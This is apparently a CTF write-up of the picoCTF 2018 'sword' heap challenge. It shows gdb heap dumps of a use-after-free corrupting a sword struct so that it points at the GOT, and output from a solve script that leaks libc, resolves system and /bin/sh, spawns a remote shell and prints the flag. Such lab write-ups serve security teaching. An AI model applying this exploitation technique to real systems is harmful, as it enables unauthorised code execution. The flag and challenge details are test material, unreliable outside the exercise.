# sword - Points: 800 - (Solves: 78)

Can you spawn a [shell][1] and get the flag?
Connect with nc 2018shell2.picoctf.com 43469.
[Source][2].
[libc.so.6][3]

[1]: https://2018shell2.picoctf.com/static/079dcd72e1f8f32e4f87c20892f89a3c/sword
[2]: https://2018shell2.picoctf.com/static/079dcd72e1f8f32e4f87c20892f89a3c/sword.c
[3]: https://2018shell2.picoctf.com/static/079dcd72e1f8f32e4f87c20892f89a3c/libc.so.6

## Hints

- ever heard of use after free?
- Make sure you are run/debug with the provided libc on the shell server

---

```txt
% ctags -x --c-kinds=vd sword.c
ALARM_TIME       macro        11 sword.c          #define ALARM_TIME 30
FORGE_TIME       macro        10 sword.c          #define FORGE_TIME 2
MAX_SWORD_LEN    macro         9 sword.c          #define MAX_SWORD_LEN 0x100
MAX_SWORD_NUM    macro         7 sword.c          #define MAX_SWORD_NUM 6
READ_INT_BUF_LEN macro         8 sword.c          #define READ_INT_BUF_LEN 32
sword_lists      variable     27 sword.c          struct sword_list_s sword_lists[MAX_SWORD_NUM];
```

Create 1st chunks and "harden" it with 256 length character 'A'.

```sh
--- sword_lists ------------------------------------
$1 = {{
    is_used = 1,
    sword = 0x7d7010
  }, {
    is_used = 1,
    sword = 0x7d7040
  }, {
    is_used = 0,
    sword = 0x0
  }, {
    is_used = 0,
    sword = 0x0
  }, {
    is_used = 0,
    sword = 0x0
  }, {
    is_used = 0,
    sword = 0x0
  }}
--- heap mapping -----------------------------------
0x7d7010:       0x0000000000000000      0x00000000007d7040
0x7d7020:       0x0000000000400b9d      0x0000000000000000
0x7d7030:       0x0000000000000000      0x0000000000000031
0x7d7040:       0x4141414141414141      0x0000000000602020
0x7d7050:       0x4141414141414141      0x4141414100000000
0x7d7060:       0x4141414141414141      0x0000000000020fa1
0x7d7070:       0x4141414141414141      0x4141414141414141
0x7d7080:       0x4141414141414141      0x4141414141414141
0x7d7090:       0x4141414141414141      0x4141414141414141
0x7d70a0:       0x4141414141414141      0x4141414141414141
0x7d70b0:       0x4141414141414141      0x4141414141414141
0x7d70c0:       0x4141414141414141      0x4141414141414141
0x7d70d0:       0x4141414141414141      0x4141414141414141
0x7d70e0:       0x4141414141414141      0x4141414141414141
0x7d70f0:       0x4141414141414141      0x4141414141414141
0x7d7100:       0x4141414141414141      0x4141414141414141
(gdb) p *sword_lists[1].sword
$5 = {
  name_len = 1094795585,
  weight = 1094795585,
  sword_name = 0x602020 "\220\326\024ǅ\177",
  use_sword = 0x4141414141414141,
  is_hardened = 0
}
```

Result:

```sh
% py solve.py REMOTE
[*] '/home/zzzz/pico18/pwn/sword/sword'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RPATH:    './'
[*] '/home/zzzz/pico18/pwn/sword/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 2018shell2.picoctf.com on port 43469: Done
[*] puts @ plt    : 0x7fcf4aa51690
[*] libc          : 0x7fcf4a9e2000
[*] bin_sh        : 0x7fcf4ab6ed57
[*] system        : 0x7fcf4aa27390
[*] Switching to interactive mode
total 1920
drwxr-x---   2 hacksports sword_0       4096 Sep 28 08:29 .
drwxr-x--x 576 root       root         53248 Sep 30 03:50 ..
-r--r-----   1 hacksports sword_0         45 Sep 28 15:12 flag.txt
-rwxr-sr-x   1 hacksports sword_0    1868984 Sep 28 15:08 libc.so.6
-rwxr-sr-x   1 hacksports sword_0      18080 Sep 28 15:12 sword
-rw-rw-r--   1 hacksports hacksports    6358 Sep 28 15:12 sword.c
-rwxr-sr-x   1 hacksports sword_0        109 Sep 28 15:12 xinet_startup.sh
$ cat flag.txt
picoCTF{usE_aFt3R_fr3e_1s_aN_1ssu3_05365660}
$
```
